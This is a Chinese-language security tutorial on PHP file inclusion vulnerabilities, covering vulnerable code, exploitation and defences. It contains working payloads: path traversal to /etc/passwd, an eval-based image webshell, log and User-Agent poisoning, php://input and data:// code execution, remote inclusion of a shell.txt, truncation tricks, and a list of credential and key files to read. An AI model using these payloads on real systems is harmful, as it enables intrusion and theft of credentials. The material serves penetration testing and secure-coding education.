## 0x00 文件包含漏洞概述
程序在引用文件时，引入的文件名用户可控，且没有经过合理的校验，从而操作了预想之外的文件，就会造成文件包含漏洞。  
开发人员一般会把重复使用的函数写到单个文件中，需要使用时直接调用该文件，而无需再次编写，这种文件调用过程一般称为文件包含。  
开发人员一般希望代码更加灵活，所以会把被包含的文件设置为变量，用来动态调用，正是由于这种灵活性，会导致客户端包含一个恶意文件，造成文件包含漏洞。  
文件包含漏洞在 php Web 应用中居多。  

## 0x01 常见文件包含函数
- include():执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行；
- require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本；
- include_once()和 require_once()：若文件中代码已被包含则不会再次包含；  

## 0x02 文件包含漏洞代码分析
```php
<?php
$html='';
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";
}

//安全的写法是使用白名单
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    if($filename=='file1.php' || $filename=='file2.php'){
        include "include/$filename";
    }  
}
?>
```
在代码中可以看到，$_GET['filename'] 接收客户端传的参数，没有经过任何过滤就带入到 include 文件包含函数中。include包含这个文件，引入到当前文件中，就会造成文件包含漏洞。  

## 0x03 本地文件包含漏洞利用方法
文件包含漏洞，可以是服务器内部的文件（本地文件），需要权限可读。  

### 1.文件包含/etc/passwd
payload：loacl.php?filename=../../../../../../../../etc/passwd&submit=提交查询  

其中../是上一级路径，我们可以加很多../来返回到网站根目录，从而读取passwd敏感文件。  
如果存在漏洞，文件又存在的时候，不是 php 文件也会被读取显示在页面中。  
/etc/passwd文件是 linux 里的敏感信息，文件里存有 linux 用户的配置信息。

### 2.文件包含图片马
这里可以结合文件上传漏洞，我们上传一个包含恶意代码的jpg文件，当然jpg是图片不能运行，所以这里就结合文件包含漏洞利用。  
我们需要找到上传点，上传图片马后，找到图片马的存储路径，在这里是/06/vul/unsafeuploaded/uploads/1.jpg，当文件被包含进来时，代码就会执行。  
恶意代码如下，然后修改文件扩展名为jpg，shell.jpg：  
```php
<?php phpinfo();eval($_POST['cmd']);?>
```
当前的文件路径是include下，绝对路径是：/var/www/html/06/vul/fileinclude/include 。这是文件包含漏洞代码存在位置，但是上传的图片马位置在：/06/vul/unsafeuploaded/uploads/1.jpg。所以需要先去到上上级目录，然后进入unsafeuploaded/uploads/下，找到图片马才行。  
payload：loacl.php?filename=../../unsafeuploaded/uploads/1.jpg&submit=提交查询  

### 3.文件包含日志getshell
中间件例如 iis 、apache、nginx 这些 web 中间件，都会记录访问日志，如果访问日志中或错误日志中，存在有 php 代码，也可以引入到文件包含中。如果日志有 php 恶意代码，也可导致 getshell。  
这里要注意的是，我们通过URL发送的payload会被url编码，需要利用burp抓包后修改payload为 <?php phpinfo();eval($_POST[cmd]);?> 再把数据包发送出去。  

在Linux下日志文件默认的权限是root，而php的权限一般都是 www-data，是读取不了的，但是Windows环境下就是允许的，权限就是够的。  

Linux默认的apache路径是：  
访问日志  
/var/log/apache2/access.log  
错误日志  
/var/log/apache2/error.log  
只要通过GET传参，把payload发给服务器，日志就会记录，包含日志文件就能getshell。

### 4.包含环境变量getshell
修改User-Agent填写php代码：  
```bash
Host:192.168.0.123
User-Agent: <?php phpinfo(); ?>
```  
/proc/self/environ 这个文件里保存了系统的一些变量，如果权限足够，包含这个文件就能getshell，但是一般也是root可读，其他人没有权限。

### 5.phpinfo包含临时文件
PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。
因为临时文件名是随机的，如果目标网站上存在phpinfo，那么可以通过phpinfo来获取临时文件名，进而进行文件包含。  

原理：  
在给php发送数据包时，如果数据包里包含文件区块，无论代码中有没有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件
（通常是/tmp/php\[6个随机字符]），文件名可以在 $_FILES 变量中找到。
这个临时文件，在请求结束后就会被删除。  
同时，因为phpinfo页面会将当前请求的上下文中所有变量都打印出来，所以如果我们向phpinfo页面发送包含文件区块的数据包，
则可以在返回包里找到 $_FILES 变量的相关内容，自然也包含临时文件名。  
但是文件包含漏洞页面和phpinfo页面通常是两个页面，理论上，我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，
再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束后，临时文件就被删除了，第二个请求自然也就无法包含。  

这时候就需要用到条件竞争，具体流程如下：  
1. 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置都要塞满垃圾数据；
2. 因为phpinfo页面会将所有数据都打印出来，步骤1中的垃圾数据会将整个phpinfo界面撑的非常大；
3. php默认的输入缓冲区大小为4096，可以理解为php每次返回4096个字节给socket；
4. 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包；  
5. 此时，第一个数据包的socket链接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除；
6. 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成果包含临时文件，最终getshell；  
  
来自月神的phpinfo文件包含临时文件原理解读：  
利用php post上传时产生的临时文件，phpinfo（）读临时文件的路径和名字，本地包含漏洞生成一句话后门。  
1. php在解析 multipart/form-data 请求时，会创建临时文件，并写入上传内容，脚本执行后立即删除；
2. phpinfo页面可以输出 $_FILES 信息；
3. 通过多种方式争取时间，在临时文件删除前进行文件包含；  

php引擎首先会将文件内容保存到临时文件，然后进行相应操作，临时文件名称是php+随机字符。
$_FILES 信息中包含我们上传的临时文件路径、名称。把文件上传到phpinfo获取临时文件路径。  

```html
<!doctype html>
<html>
<body>
<form action="http://192.168.0.103/06/phpinfo.php" method="POST"
enctype="multipart/form-data">
<h3> Test upload tmp file</h3>
<label for="file">Filename:</label>
<input type="file" name="file"/><br/>
<input type="submit" name="submit" value="Submit" />
</form>
</body>
</html>
```

通过phpinfo临时文件包含getshell的脚本单独拿出来放在外面，利用时直接拿就OK。  

### 6.伪协议
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流

php.ini 设置：  
在 php.ini 里有两个重要的参数 allow_url_fopen、allow_url_include。  
allow_url_fopen:默认值是 ON。允许打开远程文件，允许 url 里的封装协议访问文件；  
allow_url_include:默认值是 OFF。包含远程文件，不允许包含 url 里的封装协议包含文件；  
每个协议的利用方法如下：  


| 协议             | 测试PHP版本 | allow_url_fopen | allow_url_include | 用法                                                                                                        |
|------------------|-------------|-----------------|-------------------|-------------------------------------------------------------------------------------------------------------|
| file://          | >=5.2        | off/on          | off/on            | `?file=/D:/soft/phpStudy/WWW/phpcode.txt`                                                                    |
| php://filter     | >=5.2        | off/on          | off/on            | `?file=php://filter/read=convert.base64-encode/resource=/index.php`                                          |
| php://input      | >=5.2        | off/on          | on                | `?file=php://input [POST DATA] <?php phpinfo()?>`                                                            |
| zip://           | >=5.2        | off/on          | off/on            | `?file=zip://D:/soft/phpStudy/WWW/file.zip#phpcode.txt`                                                      |
| compress.bzip2://| >=5.2        | off/on          | off/on            | `?file=compress.bzip2://D:/soft/phpStudy/WWW/file.bz2`<br> or <br> `?file=compress.bzip2:///D:/soft/phpStudy/WWW/file.bz2` |
| compress.zlib:// | >=5.2        | off/on          | off/on            | `?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz` <br> or <br> `?file=compress.zlib:///D:/soft/phpStudy/WWW/file.gz` |
| data://          | >=5.2        | on              | on                | `?file=data://text/plain,<?php phpinfo()?>` <br> or <br> `?file=data:text/plain;base64,PD9waHAacGhwaW5mb3gpPz4=` |

#### php://input
php://input 可以访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行。  

什么是原始数据只读流？  
php://input是一个特殊流，他提供了对原始HTTP请求体的只读访问。例如，在一个HTTP POST请求中，HTTP请求体可能包含了提交的表单数据、JSON、XML或其他类型的数据。
使用php://input可以直接获取这些原始数据，而不需要依赖PHP自动解析的数据（如$_POST）。  
只读流意味着只能读取数据，不能修改或写入数据。对于 php://input 来说，它是请求体的只读视图。可以读取HTTP请求中的原始数据，但是无法通过这个流修改数据。  

#### file://访问本地文件
在本地文件包含漏洞里可以使用file协议，使用file协议可以读取本地文件。  
file:///etc/passwd 使用绝对路径  
http://192.168.0.103/lfi.php?file=./01/php.ini 相对文件路径

#### php://
php://用于访问各个输入输出流（I/O streams）。经常使用的是php://filter 和 php://input。  
php://filter 用于读取源码  
php://input 用于执行 php 代码。  

| 协议                      | 作用                                                                                                                                                   |
|---------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------|
| php://input                | 可以访问请求的原始数据的只读流。在 POST 请求中访问 POST 的 data 部分，在 enctype="multipart/form-data" 的时候 php://input 是无效的。                                                            |
| php://output               | 写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。                                                                                             |
| php://fd                   | (>=5.3.6) 允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。                                                                               |
| php://memory php://temp    | (>=5.1.0) 一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在存内存中，而 php://temp 会在内存容量达到预定的限制后（默认为 2MB）存入临时文件中。临时文件位置的定义和 sys_get_temp_dir() 的方式一致。 |
| php://filter               | (>=5.0.0) 一种过滤装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents() 在数据流内容读取之前没有机会应用其他过滤器。 |

php://filter 参数详解  

| 参数                         | 描述                                                                                     |
|------------------------------|------------------------------------------------------------------------------------------|
| resource=<要过滤的数据流>      | 必须项。它指定了你要筛选过滤的数据流。                                                   |
| read=<读链的过滤器>           | 该参数可选。可以设定一个或多个过滤器名称，以管道符 (|) 分隔。                            |
| write=<写链的筛选列表>        | 该参数可选。可以设定一个或多个过滤器名称，以管道符 (|) 分隔。                            |
| ; 两个链的过滤器              | 任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。                                           |

可用过滤器列表：  
```txt
字符串过滤器         作用
string.rot13        等同于 str_rot13()，rot13 变换
string.toupper      等同于 strtoupper()，转大写字母
string.tolower      等同于 strtolower()，转小写字母
string.strip_tags   等同于 strip_tags()，去除 html、PHP 语言标签

转换过滤器及作用
convert.base64-encode & convert.base64-decode 等同于 base64_encode()和 base64_decode()，base64 编码解码
bzip2.compress & bzip2.decompress  bzip2.decompress同上，在本地文件系统中创建bz2 兼容文件的方法。

加密过滤器及作用
mcrypt.*    libmcrypt 对称加密算法
mdecrypt.*  libmcrypt 对称解密算法
```

使用协议读取文件源码  
php://filter/read=convert.base64-encode/resource=/etc/passwd  
先读取文件，再进行base64编码。  

#### phar://、zip://、bzip2://、zlib://
用于读取压缩文件，zip:// 、 bzip2:// 、 zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。  

1、zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt  

2、compress.bzip2://file.bz2
http://127.0.0.1/include.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg
http://127.0.0.1/include.php?file=compress.bzip2://./file.jpg

3、compress.zlib://file.gz
http://127.0.0.1/include.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg
http://127.0.0.1/include.php?file=compress.zlib://./file.jpg

4、phar://
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt

#### data://协议
1、data://text/plain,  
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>  

2、data://text/plain;base64,  
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b  

## 0x04 文件包含常用路径
```txt
包含日志文件 getshell
/usr/local/apache2/logs/access_log
/logs/access_log
/etc/httpd/logs/access_log
/var/log/httpd/access_log

读取网站配置文件
dedecms 数据库配置文件 data/common.inc.php,
discuz 全局配置文件 config/config_global.php,
phpcms 配置文件 caches/configs/database.php
phpwind 配置文件 conf/database.php
wordpress 配置文件 wp-config.php

包含系统配置文件
windows
C:/boot.ini//查看系统版本
C:/Windows/System32/inetsrv/MetaBase.xml//IIS 配置文件
C:/Windows/repairsam//存储系统初次安装的密码
C:/Program Files/mysql/my.ini//Mysql 配置
C:/Program Files/mysql/data/mysql/user.MYD//Mysql root
C:/Windows/php.ini//php 配置信息
C:/Windows/my.ini//Mysql 配置信息

linux
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts
/etc/passwd
/etc/shadow
/etc/my.cnf
/etc/httpd/conf/httpd.conf
/root/.bash_history
/root/.mysql_history
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/porc/config.gz
```

## 0x05 包含远程文件
当远程文件开启时，可以包含远程文件到本地执行。当 allow_url_fopen=On，allow_url_include=ON 两个条件同时为 On 允许远程包含文件。  
http://192.168.0.103/lfi.php?file=http://远程IP/shell.txt

## 0x06 文件名包含截断攻击
文件包含截断攻击，在 php 版本小于 5.3.4 允许使用%00 截断，在使用 include 等文件包含函数，可以截断文件名，截断会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成\0 截断会失败。  
有时后台的代码会指定文件扩展名：  
```php
include $_GET['file'].'.jpg';

include $_GET['file'].'.txt';

include $_GET['file'].'.php';

```
此时我们上传的文件扩展名就被指定了，如何进行逃逸呢？就需要用到文件包含截断攻击了。  
上面虽然指定了文件类型（即文件扩展名），但是上传的文件名我们可控，就可以进行截断攻击。
### 1.文件包含%00截断
上传带有恶意代码的文件到网站目录，包含引入再进行 %00 截断。  
测试版本： php 5.2.17  gpc=off  
此时我们输入：  
lfi=file=shell.php%00  
即可摆脱代码中限定的文件扩展名。  

### 2.超长文件包含截断
这个合适于 win32 可以使用\\. 和 . 进行截断。  
(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256)  
利用操作系统对目录最大长度限制，win32下是256字节，Linux下是4096字节。  
点截断：  
```text
http://include.moonteam.com/file02.php?file=x.jpg............................................
.............................................................................................
.............................................................................................
....
```

//. 截断

```text
http://include.moonteam.com/file02.php?file=x.jpg%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%
2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f
%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2
e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%
2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f
%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2
e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%
2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e

```

### 3.远程文件包含
适用于远程文件包含的字符有：  
\# 对应URL编码是 %23；  
? 对应URL编码是%3f；
00 对应URL编码是 %00；  
以上字符都可以截断，但是要确保以下条件：  
allow_url_fopen = On  
allow_url_include=On  
示例：  
http://192.168.0.103/lfi2.php?file=http://192.168.0.103/shell.txt?  
即可正常显示 shell.txt 文本。

## 0x07 文件包含漏洞防御方法
1. 严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；
2. 路径限制：限制被包含的文件只能在某一文件路径下，一定要禁止目录跳转字符，如："../"；
3. 包含文件验证：验证被包含的文件是否是白名单中的一员；
4. 尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include('head.php')；
5. 设置 allow_url_include 为 Off；